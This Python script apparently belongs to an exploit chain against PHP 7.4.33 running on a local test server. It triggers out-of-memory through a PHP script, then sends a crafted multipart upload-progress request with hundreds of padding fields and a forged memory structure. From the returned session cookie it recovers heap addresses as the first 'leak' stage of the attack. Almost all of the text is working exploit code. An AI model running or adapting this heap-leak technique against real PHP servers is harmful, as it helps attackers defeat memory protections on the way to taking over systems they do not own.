"""Test if OOM triggered by a PHP script can be used for the stage-1 leak.
The key insight: instead of triggering OOM via a large field (which is blocked by
the per-field limit), trigger it via a PHP script that allocates memory internally.
"""
import sys, os, time, struct, http.client
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18108/"
t = E.Target(URL, timeout=180.0, verbose=False)

def test_php_oom_leak(port, label):
    """Test if PHP-script OOM can trigger the stage-1 leak."""
    print(f"\n--- {label} ---", flush=True)

    # Step 1: Trigger OOM via PHP script
    print("  Step 1: Trigger OOM via PHP script...", flush=True)
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=30)
    conn.request("GET", "/oom_test.php")
    r1 = conn.getresponse()
    body = r1.read()
    print(f"    Response: {len(body)}B (0B = OOM triggered)", flush=True)
    conn.close()
    time.sleep(1)

    # Step 2: Try to leak
    print("  Step 2: Try to leak...", flush=True)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})

    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
        raw = E.parse_cookie(r2)
        oom = len(raw) > 100
        c = Counter()
        for i in range(0, len(raw) - 8, 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x700000000000 <= v < 0x800000000000:
                c[v & ~0x1FFFFF] += 1
        chunk = c.most_common(1)[0][0] if c else 0
        tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
        chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
        print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
        return oom
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False

# Test on 7.4.33 (memory_limit=2M)
print("=== PHP OOM leak test on 7.4.33 (memory_limit=2M) ===", flush=True)
test_php_oom_leak(18108, "7.4.33")

print("\n=== done ===", flush=True)
